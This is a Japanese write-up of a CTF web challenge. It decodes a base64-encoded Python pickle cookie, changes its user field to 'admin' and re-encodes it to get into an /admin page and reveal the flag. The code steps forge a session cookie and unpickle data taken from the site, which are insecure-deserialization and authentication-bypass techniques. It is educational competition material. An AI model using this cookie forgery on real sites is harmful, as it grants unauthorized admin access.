# Spotted Quoll 
Category: Web  
Point: 50

## Question
[This](https://spotted-quoll.ctfcompetition.com/) blog on Zombie research looks like it might be interesting - can you break into the /admin section?

## FLAG
`CTF{but_wait,theres_more.if_you_call}`

## Answer
ページにアクセスすると，変哲もないWebサイトに，Adminユーザのためのリンクが存在するが，リンクを踏んでもフラグは表示されない．  
また自動的に`obsoletePickle`という名前に何らかの値が乗ったCookieが与えられる．
`obsoletePickle=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu`  
方針としては，このCookieを利用して，adminになりすますことが考えられる．

手始めに，Cookieの値をBase64でデコードする．
```bash
$ echo 'KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu' | base64 -D
(dp1
S'python'
p2
S'pickles'
p3
sS'subtle'
p4
S'hint'
p5
sS'user'
p6
Ns.
```

デコード結果より，明らかに`python`や`pickles`といったキーワードが引っかかる．

Pythonには，pickleと呼ばれるオブジェクトを直列化するためのモジュールが存在しており（[参考](http://docs.python.jp/3/library/pickle.html)），
どうやら，このモジュールを使うようだと算段がつく．
```python
>>> import pickle
>>> import base64
>>> cookies = 'KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu'
>>> data = pickle.loads(base64.b64decode(cookies))
>>> data
{'python': 'pickles', 'subtle': 'hint', 'user': None}
```
ここで，`data`の中身を見ると，`user`キーの値が，`None`になっていることがわかる．
そのため，ここを`admin`にしたうえで，もう一度pickleで直列化し，base64エンコードすれば良さそうだと思われる．

```python
>>> data['user'] = 'admin'
>>> admin_cookies = base64.b64encode(pickle.dumps(data))
>>> admin_cookies
b'KGRwMApWc3VidGxlCnAxClZoaW50CnAyCnNWdXNlcgpwMwpWYWRtaW4KcDQKc1ZweXRob24KcDUKVnBpY2tsZXMKcDYKcy4='
```

これで，`user`キーの値を`admin`に変更したpickleオブジェクトをBase64エンコードしたもの
`KGRwMApWc3VidGxlCnAxClZoaW50CnAyCnNWdXNlcgpwMwpWYWRtaW4KcDQKc1ZweXRob24KcDUKVnBpY2tsZXMKcDYKcy4=`  
が出来上がった．

あとは，これをCookieの`obsoletePickle`にセットして，adminページにリンクすると，フラグが表示される．

## Author
GitHub: @asakasa
